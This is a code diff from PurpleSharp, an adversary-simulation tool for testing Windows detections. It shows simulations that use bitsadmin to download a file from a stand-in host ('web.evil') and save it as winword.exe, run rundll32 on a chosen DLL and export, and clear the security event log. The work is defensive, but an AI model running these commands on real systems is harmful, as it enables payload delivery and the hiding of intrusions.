@@ -69,7 +69,7 @@ namespace PurpleSharp.Simulations
         public static void RegsvcsRegasm(string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
-            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            Logger logger = new Logger(currentPath + log);
             logger.SimulationHeader("T1218.009");
             try
             {
@@ -85,16 +85,15 @@ namespace PurpleSharp.Simulations
 
         }
 
-        public static void BitsJobs(string log)
+        public static void BitsJobs(PlaybookTask playbook_task, string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
-            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            Logger logger = new Logger(currentPath + log);
             logger.SimulationHeader("T1197");
             try
             {
-                string url = "http://web.evil/sc.exe";
                 string file = @"C:\Windows\Temp\winword.exe";
-                ExecutionHelper.StartProcessApi("", String.Format("bitsadmin /transfer job /download /priority high {0} {1}", url, file), logger);
+                ExecutionHelper.StartProcessApi("", String.Format("bitsadmin /transfer job /download /priority high {0} {1}", playbook_task.url, file), logger);
                 logger.SimulationFinished();
             }
             catch (Exception ex)
@@ -155,15 +154,14 @@ namespace PurpleSharp.Simulations
             }
         }
 
-        public static void Rundll32(string log)
+        public static void Rundll32(PlaybookTask playbook_task, string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
-            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            Logger logger = new Logger(currentPath + log);
             logger.SimulationHeader("T1218.011");
             try
             {
-                string file = @"C:\Windows\twain_64.dll";
-                ExecutionHelper.StartProcessApi("", String.Format("rundll32 \"{0}\"", file), logger);
+                ExecutionHelper.StartProcessApi("", String.Format("rundll32 \"{0}\", {1}", playbook_task.dllPath, playbook_task.exportName), logger);
                 logger.SimulationFinished();
             }
             catch(Exception ex)
@@ -175,7 +173,7 @@ namespace PurpleSharp.Simulations
         public static void ClearSecurityEventLogCmd(string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
-            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            Logger logger = new Logger(currentPath + log);
             logger.SimulationHeader("T1070.001");
             logger.TimestampInfo("Using the command line to execute the technique");
             try
